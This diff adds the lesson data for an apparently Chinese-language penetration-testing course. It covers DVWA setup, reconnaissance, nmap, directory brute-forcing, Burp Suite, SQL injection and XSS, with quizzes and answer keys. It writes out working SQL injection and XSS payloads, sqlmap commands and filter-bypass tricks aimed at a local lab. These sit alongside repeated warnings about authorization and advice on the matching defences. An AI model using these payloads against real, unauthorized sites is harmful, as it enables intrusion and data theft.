+       out:'docker ps 里能看到 dvwa 状态 Up；浏览器打开 8080 出现 DVWA 登录页（默认 admin / password）。',
+       hints:['端口被占用就换一个：-p 8081:80。','DVWA 首次进入要先点页面底部的 Create / Reset Database 建库，否则登录会报错。'],
+       try:{need:['docker','run','-p'], hint:'要用 docker run，并且用 -p 做端口映射，否则宿主机访问不到。'}}
+    ],
+    pitfalls:[
+      '在公网随便找个网站「练手」——这是犯罪，不是练习。永远只用靶场或授权目标。',
+      '不做快照就开始折腾，最后系统起不来，只能重装。',
+      '把靶场端口映射到 0.0.0.0 又连了公共 WiFi，等于给整栋楼开了个后门练习室。绑定 127.0.0.1 更安全。'
+    ],
+    quiz:{q:'下列哪种情况属于合法渗透测试？',
+      opts:['看到一个有趣的电商网站，想试试能不能注入','公司书面授权，在约定时间对指定系统做测试','在别人的服务器上留个后门，提醒他加固','扫描整个学校网段，找有没有弱口令'],
+      a:1, exp:'关键在「书面授权 + 明确范围 + 约定时间」。其余三项无论动机多好，都触犯《刑法》285/286 条。'}
+  },
+  {
+    id:'l0-2', title:'Kali 生存指南：5 个命令撑起 80% 的工作', time:'30 分钟', level:'入门',
+    tags:['Linux','bash','tmux','man'],
+    goal:[
+      '在 Kali 里自由移动、看文件、改权限',
+      '用管道和重定向把工具输出变成可搜索的证据',
+      '用 tmux 让长时间扫描不怕断线'
+    ],
+    concepts:[
+      {t:'一切皆文件', d:'Linux 里网卡、磁盘、进程信息都是文件（/proc、/dev）。所以很多「高级操作」其实就是读一个文件。'},
+      {t:'管道 |', d:'把前一个命令的输出，当成后一个命令的输入。这是把零散工具串成工作流的核心。'},
+      {t:'重定向 >', d:'把输出写进文件。扫描结果不落盘，等于白扫。'},
+      {t:'tmux', d:'终端复用器。会话可以断线重连，扫描跑 3 小时也不怕 SSH 掉线。'}
+    ],
+    steps:[
+      {title:'移动、查看、改权限',
+       cmd:'ls -la /usr/share/wordlists\ncd /usr/share/wordlists && ls -lh\nchmod +x ./tool.sh',
+       why:'-la 会显示隐藏文件和权限位（rwx）。看懂权限很重要：下载来的脚本没有 x 位就执行不了，这就是新手最常见的「Permission denied」。',
+       out:'能看到 rockyou.txt.gz 这类字典文件；权限列形如 -rw-r--r--。',
+       hints:['rockyou 字典是压缩的，用 gunzip rockyou.txt.gz 解压后再用。','看不懂某个参数就 man ls，按 q 退出。'],
+       try:{need:['ls','-la'], hint:'用 ls 加上显示全部（含隐藏文件）和长格式的参数。'}},
+      {title:'用管道把输出变成线索',
+       cmd:'nmap -sV 192.168.56.10 | grep -i open | tee scan-open.txt',
+       why:'grep 过滤出真正有用的行，tee 一边显示一边存文件。真实工作中扫描输出上千行，你要的是「哪些端口开着、跑什么服务」。',
+       out:'屏幕上只剩 open 的行，同时目录下多出 scan-open.txt。',
+       hints:['-i 是忽略大小写，避免因为服务名大小写不同漏掉结果。','统计行数可以用 ... | wc -l。'],
+       try:{need:['grep','tee'], hint:'先过滤（grep），再同时输出到屏幕和文件（tee）。'}},
+      {title:'开一个 tmux 会话再跑长任务',
+       cmd:'tmux new -s scan\n# 里面正常跑扫描；按 Ctrl+b 再按 d 脱离\ntmux attach -t scan',
+       why:'Ctrl+b d 只是「离开」会话，任务还在后台跑；attach 回来接着看。渗透里动辄几小时的爆破，最怕的不是慢，是断了要重来。',
+       out:'脱离后回到普通终端，tmux ls 能看到 scan 会话仍在运行。',
+       hints:['tmux 的快捷键都是先按 Ctrl+b 松手，再按功能键。','不习惯 tmux 也可以先用 nohup 命令 & 凑合，但 tmux 更适合多窗口协作。'],
+       try:{need:['tmux'], hint:'先用 tmux 新建一个命名会话。'}},
+      {title:'记不住参数时，先问工具自己',
+       cmd:'nmap --help | head -40\nman nmap\napropos port-scan',
+       why:'没人背得下所有参数。--help 给常用参数速查，man 给完整手册，apropos 按关键词找「哪个工具能做这件事」。学会查文档，比背 100 条命令有用。',
+       out:'能看到 -sS / -sV / -p 等参数说明。',
+       hints:['man 里按 / 搜索关键词，n 跳下一个，q 退出。','apropos 需要先 updatedb，找不到结果时别慌。']}
+    ],
+    pitfalls:[
+      '复制命令不看参数就回车——尤其是带 -f、--force、rm 的命令。',
+      '把扫描结果只留在屏幕上，关掉终端就没了。',
+      '用 root 跑一切。能用普通用户就用普通用户，需要时再 sudo。'
+    ],
+    quiz:{q:'nmap 扫完想把「开着的端口」存成文件，最合适的是？',
+      opts:['nmap ... > /dev/null','nmap ... | grep open | tee open.txt','nmap ... && rm -f *.txt','nmap ... | less'],
+      a:1, exp:'grep 负责筛出 open 行，tee 同时写屏和写文件，结果可复盘、可交给队友。'}
+  }
+  ]
+},
+
+/* ================= 第 1 章 ================= */
+{
+  id:'m1', no:'1', icon:'🛰️', name:'信息收集：先看清战场', short:'信息收集',
+  desc:'不碰目标也能拿到一半情报；会用 nmap 把「谁在线、开什么服务」摸清楚。',
+  lessons:[
+  {
+    id:'l1-1', title:'被动侦察：不碰目标也能摸清底细', time:'30 分钟', level:'入门',
+    tags:['OSINT','whois','dig','子域名'],
+    goal:[
+      '理解「被动」和「主动」的区别与风险差异',
+      '用 whois / dig 拿到域名与邮件服务器信息',
+      '通过证书透明日志找出隐藏子域名'
+    ],
+    concepts:[
+      {t:'被动侦察', d:'只查第三方公开数据（注册信息、证书、搜索引擎），不向目标发一个包，因此几乎不会留下痕迹，也不会触发告警。'},
+      {t:'主动侦察', d:'直接向目标发包（扫描、爆破）。信息更准，但会被 WAF、IDS 记录，必须确保授权。'},
+      {t:'攻击面', d:'目标暴露在公网的一切：域名、子域、IP、开放端口、员工邮箱、泄露的代码。收集得越全，后面越省力。'}
+    ],
+    steps:[
+      {title:'查域名注册信息',
+       cmd:'whois example.com | head -30',
+       why:'whois 返回注册人、注册商、创建时间、NS 服务器。NS 能告诉你域名托管在哪家云，注册邮箱可能是社工入口，创建时间能判断这是老站还是刚上线的新业务（新业务通常更脆弱）。',
+       out:'能看到 Registrar、Name Server、Creation Date 等字段。',
+       hints:['现在多数域名开了隐私保护，注册人看不到是正常的，别死磕。','关注 NS 记录：ns1.digitalocean.com 这类值直接暴露了云厂商。'],
+       try:{need:['whois'], hint:'这条命令就是查域名注册信息的工具名。'}},
+      {title:'查 DNS 记录，找邮件与旁站',
+       cmd:'dig +short example.com A\ndig +short example.com MX\ndig +short example.com TXT',
+       why:'A 记录给 IP，MX 给邮件服务器（邮件网关往往比主站防护弱），TXT 常含 SPF、以及各种「域名所有权验证」字符串——后者经常泄露这个团队在用哪些 SaaS 服务。',
+       out:'每个命令输出一到几行值，MX 记录形如 10 mail.example.com。',
+       hints:['+short 只输出结果，不加这个参数会返回一大段完整应答。','想查某个 DNS 服务器的记录：dig @8.8.8.8 example.com。'],
+       try:{need:['dig'], hint:'用 dig 查询，并加上让输出简洁的参数。'}},
+      {title:'用证书透明日志挖子域名',
+       cmd:'# 浏览器打开 https://crt.sh 搜索 %.example.com\n# 或命令行：\ncurl -s "https://crt.sh/?q=%25.example.com&output=json" | grep -o "\"name_value\":\"[^\"]*\"" | sort -u',
+       why:'每次给子域签发 HTTPS 证书，都会公开记录在证书透明日志里。于是 dev.example.com、test.example.com、vpn.example.com 这些「以为没人知道」的入口全暴露了。这是被动侦察里性价比最高的一招。',
+       out:'一长串去重后的子域名，常能看到 dev / test / staging / mail 等。',
+       hints:['% 在 URL 里是通配符，要写成 %25 转义。','拿到列表先挑 dev、test、admin、vpn 这类名字，它们通常最松。']},
+      {title:'把情报整理成一张表',
+       cmd:'# 建议列：资产 | 类型 | 来源 | 价值判断 | 待验证',
+       why:'零散信息不是情报。表格强迫你判断「这条线索值不值得跟进」，也是后面写报告、跟队友同步的基础。专业和业余的差别，常常就在这张表上。',
+       out:'至少 10 行资产记录，每条都有来源。',
+       hints:['价值判断可以简单分三档：高（疑似未加固的测试环境）/ 中 / 低。','记录来源很重要，报告里必须能追溯每个结论的依据。']}
+    ],
+    pitfalls:[
+      '把被动做成主动：用字典暴力猜子域名会把你的 IP 暴露在对方日志里。',
+      '只盯主域名，忘了 IP 段、移动端 App、公众号、GitHub 组织。',
+      '收集完不整理，两小时后完全忘记哪条线索来自哪。'
+    ],
+    quiz:{q:'为什么说证书透明日志（crt.sh）属于「被动」侦察？',
+      opts:['因为它需要向目标服务器发大量请求','因为数据来自公开的第三方日志，不直接接触目标','因为它只能用浏览器访问','因为它拿不到真实子域名'],
+      a:1, exp:'证书透明是公开可查的日志，你只是查别人的公开记录，目标侧不会看到你的探测流量。'}
+  },
+  {
+    id:'l1-2', title:'nmap 三板斧：谁在线、开什么、什么版本', time:'40 分钟', level:'入门',
+    tags:['nmap','端口扫描','服务识别'],
+    goal:[
+      '用主机发现找出网段里活着的机器',
+      '完成一次全端口扫描并读懂结果',
+      '用版本探测把「开放端口」变成「可利用的漏洞线索」'
+    ],
+    concepts:[
+      {t:'SYN 半开扫描', d:'只发 SYN、收到 SYN/ACK 就判断端口开放，然后立刻断开，不完成三次握手。比全连接扫描更快更隐蔽，需要 root 权限。'},
+      {t:'全端口 -p-', d:'默认只扫最常见的 1000 个端口。真实环境里服务经常藏在 8080、8443、9000 这类高位端口，漏扫等于漏机会。'},
+      {t:'版本探测 -sV', d:'不止告诉你「80 端口开着」，还告诉你「是 Apache 2.4.49」。有了版本号才能对 CVE，这是从「信息」到「攻击面」的关键一步。'}
+    ],
+    steps:[
+      {title:'先看网段里有谁',
+       cmd:'sudo nmap -sn 192.168.56.0/24',
+       why:'-sn 只做主机发现，不扫端口，速度快、噪音小。先知道有几台机器，再决定对谁做深度扫描，避免一上来就全网段狂扫被防守方盯上。',
+       out:'每台在线主机一行 Nmap scan report for 192.168.56.x，末尾统计 hosts up。',
+       hints:['局域网里 ARP 探测最准，不加 sudo 可能只用 ICMP，会漏掉禁 ping 的主机。','结果里 MAC 地址能看出设备厂商，虚拟机通常是 08:00:27 或 00:0C:29。'],
+       try:{need:['nmap','-sn'], hint:'nmap 只做主机发现（不扫端口）的参数是 -sn。'}},
+      {title:'全端口快扫，别漏高位端口',
+       cmd:'sudo nmap -sS -p- --min-rate 1000 -T4 192.168.56.10 -oA full-scan',
+       why:'-sS 半开扫描更快；-p- 扫全部 65535 个端口；--min-rate 限制发包速率，别把目标打挂；-oA 同时输出三种格式，方便后面复查和写报告。',
+       out:'一张端口表，重点看 open 的行；结尾有 «Nmap done»。',
+       hints:['扫描很慢时加 -T4（激进时序），但别在真实授权环境随便用 -T5。','只扫 TCP 会漏 UDP 服务，DNS 53、SNMP 161 都在 UDP 上，需要单独 -sU。'],
+       try:{need:['-p-','-ss'], hint:'参数要有 -sS 和全端口 -p-。'}},
+      {title:'对开放端口做版本与默认脚本探测',
+       cmd:'sudo nmap -sV -sC -p 22,80,445 192.168.56.10 -oA service-scan',
+       why:'-sV 拿版本号，-sC 跑一组安全的默认脚本（会读 banner、试匿名登录、看 SMB 共享）。这一步把「端口」翻译成「可能有什么漏洞」，是渗透里信息量最大的十分钟。',
+       out:'每个端口下列出 service、version，以及脚本输出片段。',
+       hints:['看到 http 就顺手加上 --script http-title,http-headers，能直接拿到网站标题。','想找已知漏洞：--script vuln，但会很吵，只在授权环境用。'],
+       try:{need:['-sv','-sc'], hint:'两个关键参数：版本探测和默认脚本。'}},
+      {title:'把结果读成「下一步该干什么」',
+       cmd:'grep -E "open|OS" service-scan.nmap',
+       why:'扫描本身不值钱，值钱的是判断：22 开 = 可以试密钥登录；445 开 = 想想 SMB 空会话和永恒之蓝；3306 开 = 数据库是否对外。每个开放端口都对应一串验证动作。',
+       out:'一份「端口 → 推测服务 → 待验证动作」的清单。',
+       hints:['先按风险排序：数据库、管理后台、文件共享优先，Web 主站最后。','不确定服务是什么时，用 nc -nv IP PORT 手动抓个 banner。']}
+    ],
+    pitfalls:[
+      '只扫默认 1000 端口，错过 8080 / 8443 / 9000 上的真实入口。',
+      '不保存结果，隔天想复核只能重扫一遍。',
+      '对生产系统用 -T5 或超大并发，直接把服务打挂——这在授权测试里也算事故。'
+    ],
+    quiz:{q:'为什么专业扫描一般都要加 -p- ？',
+      opts:['因为这样更快','因为默认只扫常见 1000 个端口，会漏掉高位端口上的服务','因为只有 -p- 才能识别版本','因为不加就不能保存结果'],
+      a:1, exp:'真实环境大量业务跑在 8080、8443、9000 等高位端口，只扫默认端口会漏掉主要攻击面。全端口扫描更慢，但值得。'}
+  },
+  {
+    id:'l1-3', title:'Web 指纹与目录发现：找到那个没上锁的门', time:'35 分钟', level:'入门',
+    tags:['whatweb','gobuster','nikto','目录爆破'],
+    goal:[
+      '识别目标的技术栈与框架版本',
+      '用字典发现隐藏目录、备份文件、后台入口',
+      '看懂 200 / 301 / 403 各代表什么机会'
+    ],
+    concepts:[
+      {t:'指纹识别', d:'通过响应头、Cookie 名、报错页、静态文件路径推断技术栈。知道是 ThinkPHP 还是 Spring，才知道该查哪类漏洞。'},
+      {t:'目录爆破', d:'用字典逐个请求常见路径（/admin、/backup.zip、/.git），根据状态码判断是否存在。本质是「猜文件名」，靠的是字典质量。'},
+      {t:'403 也有价值', d:'403 表示「存在但不允许访问」，说明目录真实存在，可能通过绕过、路径变形或换 Host 头打开。404 才是真的没有。'}
+    ],
+    steps:[
+      {title:'先认脸：技术栈指纹',
+       cmd:'whatweb -a 3 http://192.168.56.10\ncurl -I http://192.168.56.10',
+       why:'-a 3 是激进程度，会多发几个探测请求以获取更详细信息。curl -I 只看响应头，Server、X-Powered-By、Set-Cookie 常常直接写明 Nginx 版本、PHP 版本、框架名。',
+       out:'输出里出现 Apache/2.4.x、PHP/7.x、jQuery 版本等条目。',
+       hints:['看 Cookie 名也能猜框架：PHPSESSID 是 PHP，JSESSIONID 是 Java，csrftoken 常见于 Django。','指纹不准时，手动访问 /robots.txt、/favicon.ico 对比 hash 也有效。'],
+       try:{need:['whatweb'], hint:'这条命令就是专门做 Web 指纹识别的工具。'}},
+      {title:'跑目录字典，找隐藏入口',
+       cmd:'gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak -t 30',
+       why:'-x 指定额外后缀，能翻出 index.php.bak、config.txt 这类「开发忘了删」的文件，它们经常直接泄露数据库密码。这些才是真实渗透里最甜的入口。',
+       out:'一列路径和状态码：200 存在、301 跳转（可能是目录）、403 禁止访问。',
+      hints:['Kali 自带字典在 /usr/share/wordlists/，seclists 更全：apt install seclists。','被 WAF 拦了会全是 403/429，试试加 --delay 100ms 降低速率。'],
+       try:{need:['gobuster','-u','-w'], hint:'gobuster 的 dir 模式需要 -u 目标 和 -w 字典。'}},
+      {title:'把状态码翻译成机会',
+       cmd:'curl -s -o /dev/null -w "%{http_code} %{size_download}\\n" http://192.168.56.10/admin/',
+       why:'200 说明直接进得去；301 多半是目录，补个斜杠再试；403 说明存在但被挡，值得试路径绕过；401 是弹了登录框，可以试弱口令。会读状态码，才知道下一步该干什么。',
+       out:'类似 200 5123 的一行：状态码 + 响应大小。',
+       hints:['响应大小也很关键：403 页面大小全都一样，说明是统一拦截页，不是真目录。','遇到 301 先用 curl -L 跟随跳转，看最终落地页是什么。'],
+       try:{need:['curl','-w'], hint:'用 curl 的 -w 参数打印状态码。'}},
+      {title:'顺手做一次配置体检',
+       cmd:'nikto -h http://192.168.56.10 -Tuning 123b',
+       why:'nikto 检查的是「配置类问题」：缺安全头、目录列表开启、默认文件残留、已知危险文件。它不深挖逻辑漏洞，但能在 2 分钟内给你一份「这站有多糙」的体检报告。',
+       out:'以 + 开头的条目，每条都是一个待确认的发现。',
+      hints:['nikto 很吵，会触发大部分 WAF，仅在授权环境使用。','报告里的发现要自己复验一遍，工具误报率不低。']}
+    ],
+    pitfalls:[
+      '字典太大导致扫几小时——先用 common.txt 快速过一遍，再上大字典。',
+      '忽略 .git、.svn、.DS_Store、备份文件，这些往往比漏洞更好用。',
+      '把 403 当成「不存在」直接跳过，错过真实入口。'
+    ],
+    quiz:{q:'目录扫描返回 403，最合理的理解是？',
+      opts:['路径不存在，可以放弃','路径存在但被拒绝访问，值得尝试绕过或换访问方式','服务器宕机了','说明目标一定有这个漏洞'],
+      a:1, exp:'403 意味着资源存在、只是没权限。常见后续动作：路径变形（//admin、/./admin）、改 Host 头、换 User-Agent、找备份文件。'}
+  }
+  ]
+},
+
+/* ================= 第 2 章 ================= */
+{
+  id:'m2', no:'2', icon:'🌐', name:'Web 安全：OWASP 主战场', short:'Web 安全',
+  desc:'Burp 抓包、SQL 注入、XSS、文件上传与命令注入——从原理到复现再到修复。',
+  lessons:[
+  {
+    id:'l2-1', title:'Burp Suite：把浏览器和服务器之间的对话拦下来', time:'35 分钟', level:'入门',
+    tags:['Burp','代理','Repeater'],
+    goal:[
+      '配好浏览器代理，让流量经过 Burp',
+      '看懂一个 HTTP 请求的四部分结构',
+      '用 Repeater 手工改包并观察服务器响应'
+    ],
+    concepts:[
+      {t:'中间人代理', d:'Burp 在浏览器和服务器之间当「传话人」。你能看到每一个请求，也能改完再发——这是所有 Web 手测的基础。'},
+      {t:'HTTP 请求结构', d:'请求行（方法 + 路径 + 版本）、请求头（Cookie、UA、Referer）、空行、请求体（POST 数据）。漏洞几乎都藏在这四部分里。'},
+      {t:'Repeater', d:'把请求冻结下来，改一个字发一次，立刻看响应。它是「假设 → 验证」最快的实验台。'}
+    ],
+    steps:[
+      {title:'配代理，让流量走进 Burp',
+       cmd:'# Burp：Proxy → Proxy settings，默认监听 127.0.0.1:8080\n# 浏览器装 FoxyProxy，新建 127.0.0.1:8080 的 HTTP 代理',
+       why:'只有流量经过 Burp，你才能看到、改到。注意 HTTPS 需要额外导入 Burp 的 CA 证书，否则浏览器会报证书错误——这不是故障，是 TLS 在正常工作。',
+       out:'Burp 的 HTTP history 里开始出现浏览器的请求记录。',
+       hints:['先访问 http://burp 下载 CA 证书，导入到「受信任的根证书颁发机构」。','只代理浏览器，不要给整个系统设代理，否则一堆工具会连不上网。'],
+       try:{need:['8080'], hint:'Burp 默认监听端口是 8080。'}},
+      {title:'读懂一个请求，再决定动哪里',
+       cmd:'GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1\nHost: 192.168.56.10\nCookie: PHPSESSID=abc123; security=low\nUser-Agent: Mozilla/5.0',
+       why:'请求行告诉你方法；查询参数 id=1 是用户可控输入；Cookie 里有会话 ID 和「难度档位」。任何一个你输入的值、任何一个服务器信任的头，都可能是注入点。',
+       out:'能指出：哪些字段是用户控制的，哪些是服务器信任的。',
+       hints:['重点关注：URL 参数、POST body、Cookie、Referer、X-Forwarded-For、文件名。','每个可疑字段问一句：服务器会不会把它拼进 SQL / 命令 / 页面？']},
+      {title:'用 Repeater 做一次「改一个字符」实验',
+       cmd:'# 右键请求 → Send to Repeater（Ctrl+R）\n# 把 id=1 改成 id=1\'  然后点 Send',
+       why:'加一个单引号，看返回是报错、是空白、还是正常。报错说明输入被直接拼进了 SQL——这就是注入存在的第一个证据。手工验证永远优先于直接上工具，因为你需要知道「为什么它成立」。',
+       out:'响应里出现 SQL syntax 报错，或页面结构明显异常。',
+       hints:['报错被隐藏时，试试 1 and 1=1 与 1 and 1=2，比较两次页面差异（布尔盲注）。','别急着上 sqlmap，先用 Repeater 手工确认，你才知道 sqlmap 在做什么。'],
+       try:{need:['repeater'], hint:'Burp 里用来重放单个请求的模块叫什么？'}},
+      {title:'分析完记得关拦截',
+       cmd:'# Proxy → Intercept → 点 Intercept is on 变成 off',
+       why:'拦截开着的时候，每个请求都会被卡住等你点放行，浏览器就像断网一样。新手最常见的「网站打不开了」就是这个原因。',
+       out:'浏览器恢复正常加载，HTTP history 持续记录。',
+       hints:['想只拦特定请求，用 Proxy 的拦截规则，而不是一直开着全拦。','卡住时先看 Burp 的 Intercept 状态，再看浏览器代理设置。']}
+    ],
+    pitfalls:[
+      '忘了关拦截，以为网站坏了，排查半小时。',
+      '给整个操作系统设了代理，导致 apt、docker 全部超时。',
+      '只看响应不看请求，永远学不会「为什么这个参数危险」。'
+    ],
+    quiz:{q:'Repeater 最适合做哪件事？',
+      opts:['批量爆破密码','把单个请求冻结，改参数后反复发送对比响应','自动扫描全站漏洞','代理整个系统的网络'],
+      a:1, exp:'Repeater 是手工验证工具：一次一个请求，改完立刻看差异。批量爆破用 Intruder，自动化扫描用 Scanner。'}
+  },
+  {
+    id:'l2-2', title:'SQL 注入：从加一个引号到拖库', time:'50 分钟', level:'进阶',
+    tags:['SQLi','sqlmap','预编译'],
+    goal:[
+      '判断一个参数是否存在注入，以及是哪种注入',
+      '手工完成联合查询注入，理解每一步在问数据库什么',
+      '知道参数化查询为什么能彻底修掉它'
+    ],
+    concepts:[
+      {t:'注入的本质', d:'程序把「用户输入」当成了「代码」拼进 SQL。你输入的不是数据，是语法。'},
+      {t:'联合查询', d:'用 UNION SELECT 把自己构造的查询结果拼到原查询后面，从而在页面上读出数据库里的任意数据。'},
+      {t:'盲注', d:'页面不回显数据时，用「真/假」的差异一位一位地问出答案。慢，但几乎无解。'},
+      {t:'参数化查询', d:'把 SQL 结构和数据分开传给数据库，输入永远只是值，不是语法。这是唯一可靠的修复方式。'}
+    ],
+    steps:[
+      {title:'第一步：确认输入被拼进了 SQL',
+       cmd:"id=1'          → 观察是否报错\nid=1 and 1=1    → 页面正常\nid=1 and 1=2    → 页面异常",
+       why:'单引号打破语法看是否报错；再用 1=1 / 1=2 对比。两次结果不同，说明你的输入真的参与了 SQL 逻辑运算——这就是布尔型注入的铁证。',
+       out:'1=1 正常、1=2 异常（或内容不同），差异稳定可复现。',
+       hints:['数字型不用引号：id=1 and 1=2。字符型才需要闭合引号。','报错被吃掉时，试试 1\' and \'1\'=\'1 与 1\' and \'1\'=\'2。'],
+       try:{need:['and'], hint:'用 and 构造一个恒真、一个恒假的比较。'}},
+      {title:'猜列数：ORDER BY 试探',
+       cmd:'id=1 order by 1-- -\nid=1 order by 2-- -\nid=1 order by 3-- -   → 报错',
+       why:'ORDER BY 后面只能跟存在的列号。逐个加，直到报错，报错前那个数字就是查询的列数。必须知道列数，UNION 才能对得上。',
+       out:'前两条正常，第三条报 Unknown column，说明是 2 列。',
+      hints:['-- 后面必须跟一个空格，URL 里写成 --+ 或 --%20。','MySQL 也支持 # 注释，但 # 在 URL 里要编码成 %23。'],
+       try:{need:['order by'], hint:'用 ORDER BY 加数字递增，找出报错的临界点。'}},
+      {title:'联合查询：把数据读到页面上',
+       cmd:"id=-1 union select 1,concat(user(),0x3a,database())-- -",
+       why:'把 id 改成 -1 让原查询查不到结果，页面就只能显示你 UNION 出来的那行。concat 把用户名和库名拼在一起，一次读两个信息。数字位要对应前面的列数。',
+       out:'页面原本显示内容的位置，出现了 root@localhost:dvwa。',
+      hints:['哪一列会显示在页面上？逐个替换成标记字符串试，比如 union select 1,\'TEST\'。','读表名：union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()。'],
+       try:{need:['union','select'], hint:'把原查询废掉（id=-1），再用 UNION SELECT 拼自己的查询。'}},
+      {title:'让 sqlmap 跑一遍，但你要看得懂它在干什么',
+       cmd:'sqlmap -u "http://192.168.56.10/vulnerabilities/sqli/?id=1&Submit=Submit" \\\n  --cookie="PHPSESSID=abc123; security=low" --batch --dbs',
+       why:'--batch 用默认选项不交互，--dbs 列出所有数据库。工具会先重放你的判断、再逐步升级技术。你看得懂它的输出，才知道它什么时候在瞎猜。',
+       out:'列出 available databases，含 dvwa、information_schema。',
+       hints:['URL 里有 & 必须用引号包住，否则 shell 会把它当后台执行。','加 --level 3 --risk 2 会更深入，但也更吵、更容易把库打挂。'],
+       try:{need:['sqlmap','--dbs'], hint:'工具名 + 列出数据库的参数。'}},
+      {title:'站到防守方：把洞补上',
+       cmd:"# 错误：\"SELECT * FROM users WHERE id=\" + id\n# 正确：cursor.execute(\"SELECT * FROM users WHERE id=%s\", (id,))",
+       why:'参数化查询让数据库先编译 SQL 结构、再填入数据，输入永远无法变成语法。再加最小权限（Web 账号不给 DROP）、关掉详细报错、开 WAF 做兜底，才算完整修复。',
+       out:'同一句注入 payload 在修复后的接口上只被当成普通字符串。',
+       hints:['转义函数（addslashes）不可靠，宽字节、数字型都能绕，别当唯一方案。','ORM 的 where 拼接、order by 拼接依然是注入高发区。']}
+    ],
+    pitfalls:[
+      '忘记 -- 后面要空格，注释没生效导致一直报错。',
+      'URL 里的 & 不加引号，命令被 shell 截断。',
+      '拿到数据库就乱改数据——授权测试只读不写，除非明确允许。'
+    ],
+    quiz:{q:'下面哪种修复能真正消除 SQL 注入？',
+      opts:['过滤掉单引号','把报错信息隐藏','使用参数化查询（预编译）','在前端用 JS 校验输入'],
+      a:2, exp:'过滤黑名单总能被绕过，前端校验可以绕过，隐藏报错只是让你看不见。只有参数化查询从机制上保证「输入永远是数据」。'}
+  },
+  {
+    id:'l2-3', title:'XSS：让别人的浏览器替你执行代码', time:'40 分钟', level:'进阶',
+    tags:['XSS','CSP','输出编码'],
+    goal:[
+      '区分反射型、存储型、DOM 型 XSS',
+      '根据输出上下文选择正确的闭合方式',
+      '用输出编码 + CSP + HttpOnly 三层防御'
+    ],
+    concepts:[
+      {t:'反射型', d:'payload 在 URL 里，服务器原样回显在页面。需要诱导受害者点链接，一次性。'},
+      {t:'存储型', d:'payload 存进数据库（评论、昵称），每个访问页面的人都会中招。危害最大。'},
+      {t:'DOM 型', d:'服务器根本没碰 payload，是前端 JS 把 location.hash 之类的东西写进了 innerHTML。'},
+      {t:'上下文', d:'同一个 payload 在 HTML 正文、属性值、<script> 里、href 里的逃逸方式完全不同。先判断「我的输入落在哪」，再构造。'}
+    ],
+    steps:[
+      {title:'先测最朴素的 payload',
+       cmd:'<script>alert(1)<\/script>\n"><script>alert(1)<\/script>\n\'><img src=x onerror=alert(1)>',
+       why:'第一个测 HTML 正文，第二个用于跳出属性值，第三个用于单引号包裹的属性。弹窗出来只证明「能执行 JS」，不代表危害——但它是继续深入的入场券。',
+       out:'浏览器弹出 alert 对话框，说明该位置存在 XSS。',
+       hints:['标签被过滤时试大小写混写、双写：<scr<script>ipt>。','<script> 被拦就用事件型：<img src=x onerror=alert(1)>。'],
+       try:{need:['script'], hint:'最基础的验证 payload 用的是 script 标签。'}},
+      {title:'判断上下文，再决定怎么闭合',
+       cmd:'# 输入落在：<div>输入</div>        → 直接 <script>\n# 输入落在：<input value="输入">  → 先 " 闭合属性\n# 输入落在：<a href="输入">       → javascript:alert(1)',
+       why:'XSS 不是背 payload，是读源码。右键「查看网页源代码」，找到你的输入落在哪个标签、被什么符号包裹，才知道要闭合什么、能注入什么。这一步决定了 90% 的成功率。',
+       out:'一段明确的结论：我的输入位于 XX 标签的 XX 位置，需要闭合 XX。',
+      hints:['用 F12 检查元素看渲染后的 DOM，比看原始 HTML 更准。','看不到源码时，发一个独特字符串（如 zzq123）搜索定位。']},
+      {title:'存储型：在 DVWA 留言板里验证持久化',
+       cmd:'# DVWA → XSS (Stored) → Name 填：<script>alert(document.cookie)<\/script>\n# 提交后刷新页面，观察是否每次都弹',
+       why:'刷新后依然弹窗，说明 payload 已经写进数据库。这就是存储型 XSS 的危害：不需要骗人点链接，任何人打开这个页面就中招。攻击者常用它偷会话、挂钓鱼表单、做蠕虫。',
+       out:'每次加载页面都会执行，说明已持久化。',
+       hints:['DVWA 里 Name 字段有长度限制，payload 太长就改在 Message 里。','如果 cookie 读不到，是因为开了 HttpOnly——那是好事，说明防护生效了。']},
+      {title:'三层防御，缺一不可',
+       cmd:"# 输出编码：HTML 实体转义 & < > \" '\n# 响应头：Content-Security-Policy: default-src 'self'\n# Cookie：Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax",
+       why:'输出编码解决「我的数据被当代码执行」；CSP 让即使注入成功，浏览器也拒绝执行外来的脚本；HttpOnly 让 JS 读不到会话 Cookie。三层各挡一类问题，只做一层总有绕过。',
+       out:'修复后同样的 payload 在页面上显示为纯文本。',
+       hints:['编码要按上下文来：HTML 用实体编码，JS 里用 \\x 转义，URL 里用 encodeURIComponent。','不要用「过滤 <script>」这种黑名单，属性、事件、编码变形都能绕。']}
+    ],
+    pitfalls:[
+      '只看弹窗不看上下文，payload 换个位置就失效。',
+      '以为 HttpOnly 能防 XSS——它只防偷 Cookie，页面照样被篡改。',
+      '用前端过滤当防线，攻击者直接用 Burp 改包就绕过了。'
+    ],
+    quiz:{q:'存储型 XSS 为什么比反射型更危险？',
+      opts:['因为它更难检测','因为 payload 存进数据库，所有访问该页面的用户都会中招','因为它只能用 <script> 标签','因为它一定能拿到服务器权限'],
+      a:1, exp:'反射型需要诱导受害者点击特定链接，存储型会自动感染每一个访问者，还可能形成蠕虫式传播。'}
+  },
+  {
+    id:'l2-4', title:'文件上传与命令注入：从上传到执行', time:'45 分钟', level:'进阶',
+    tags:['文件上传','命令注入','RCE'],
+    goal:[
+      '理解「上传点 = 潜在 RCE」的逻辑链',
+      '复现后缀与 Content-Type 两种常见绕过',
+      '完成一次命令注入并解释系统调用为什么危险'
+    ],
+    concepts:[
+      {t:'上传点为什么危险', d:'如果上传目录能被 Web 访问、又能执行脚本，那你上传的不是「文件」，是「服务器上的一段代码」。'},
+      {t:'绕过检测', d:'前端校验改包就过；Content-Type 校验只信请求头；黑名单后缀可用 .phtml、.php5、大小写、双写后缀绕。'},
+      {t:'命令注入', d:'程序用 system()、exec() 拼接用户输入执行系统命令。你输入的不是参数，是命令的一部分——分号、管道、反引号都能接上新命令。'}
+    ],
+    steps:[
+      {title:'先传一个正常的图片，摸清规则',
+       cmd:'# DVWA → Upload → 上传一张 1x1 的 png\n# 再上传 test.php，观察被拦的理由',
+       why:'先确认「什么样的文件能过」，再研究「检测发生在哪一层」。是被前端 JS 拦的（改包就过），还是被后端拦的（要看报错细节）？这决定了绕过策略。',
+       out:'记录：允许的后缀、大小限制、检测位置（前端/后端）。',
